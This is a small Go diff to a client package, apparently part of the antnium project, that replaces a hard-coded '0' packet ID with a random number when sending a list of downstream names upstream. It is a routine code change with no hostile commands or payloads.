@@ -2,6 +2,8 @@ package client
 
 import (
 	"errors"
+	"math/rand"
+	"strconv"
 
 	"github.com/dobin/antnium/pkg/model"
 	log "github.com/sirupsen/logrus"
@@ -80,7 +82,8 @@ func (s *Client) SendDownstreams(downstreamList []string) error {
 	arguments := make(model.PacketArgument)
 	response := make(model.PacketResponse)
 	model.AddArrayToResponse("name", downstreamList, response)
-	packet := model.NewPacket("downstreams", s.Config.ComputerId, "0", arguments, response)
+
+	packet := model.NewPacket("downstreams", s.Config.ComputerId, strconv.Itoa(int(rand.Uint64())), arguments, response)
 
 	err := s.upstream.SendPacket(packet)
 	if err != nil {
